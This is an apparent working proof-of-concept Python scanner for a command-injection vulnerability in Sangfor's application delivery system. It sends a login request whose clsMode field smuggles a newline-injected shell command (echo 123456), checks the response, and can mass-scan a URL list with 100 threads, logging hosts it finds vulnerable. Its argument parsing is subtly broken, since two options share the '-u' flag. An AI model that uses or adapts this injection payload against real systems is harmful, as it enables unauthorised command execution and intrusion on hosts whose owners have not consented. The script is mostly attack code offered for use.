# 深信服应用交付系统命令执行漏洞
import requests, sys, argparse, re
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()


def banner():
    test = """

            ███████╗ █████╗ ███╗   ██╗ ██████╗ ███████╗ ██████╗ ██████╗ 
            ██╔════╝██╔══██╗████╗  ██║██╔════╝ ██╔════╝██╔═══██╗██╔══██╗
            ███████╗███████║██╔██╗ ██║██║  ███╗█████╗  ██║   ██║██████╔╝
            ╚════██║██╔══██║██║╚██╗██║██║   ██║██╔══╝  ██║   ██║██╔══██╗
            ███████║██║  ██║██║ ╚████║╚██████╔╝██║     ╚██████╔╝██║  ██║
            ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝      ╚═════╝ ╚═╝  ╚═╝
                                                                author:秋妤
                                                                date:2024.09.26
                                                                version:1.0                                                            

    """
    print(test)


def poc(target):
    payload = '/rep/login'
    headers = {
        'Content-Length': '124',
        'Sec-Ch-Ua': '"Not/A)Brand";v="99","GoogleChrome";v="115","Chromium";v="115"',
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Sec-Ch-Ua-Mobile': '?0',
        'User-Agent': 'Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/115.0.0.0Safari/537.36',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Accept-Encoding': 'gzip,deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'close',

    }
    data = "clsMode=cls_mode_login%0Aecho%20123456%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123"
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }

    try:
        res1 = requests.post(url=target + payload, headers=headers,verify=False, data=data, timeout=6)
        if res1.status_code == 200 and '123456' in res1.text:
            print(f"[+]目标存在 {target}")
            with open('深信服_result.txt', 'a') as f:
                f.write(f"{target} \n")
        else:
            print(f'[-]{target}不存在漏洞')
    except Exception as e:
        print(e)

def main():
    banner()
    url_list = []
    parser = argparse.ArgumentParser(description='这是一个 深信服应用交付系统命令执行漏洞 的扫描脚本')
    parser.add_argument('-u','--url',dest='url',help='Please enter url')
    parser.add_argument('-u', '--file', dest='file', help='Please enter file')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

if __name__ == '__main__':
    main()